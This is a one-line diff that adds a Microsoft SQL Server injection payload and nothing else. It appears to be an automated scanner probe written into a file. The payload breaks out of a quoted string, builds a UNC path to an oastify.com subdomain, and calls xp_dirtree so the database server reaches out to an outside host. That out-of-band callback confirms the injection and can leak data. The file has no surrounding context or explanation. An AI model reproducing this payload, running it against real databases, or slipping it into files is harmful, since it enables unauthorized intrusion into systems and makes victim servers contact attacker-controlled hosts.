@@ -1,0 +1,1 @@
+BdajbPcE7i';declare @q varchar(99);set @q='\\4fkc31je8jl50pci5sisce176ycw0n0br2fu2lqa.oasti'+'fy.com\aha'; exec master.dbo.xp_dirtree @q;-- 
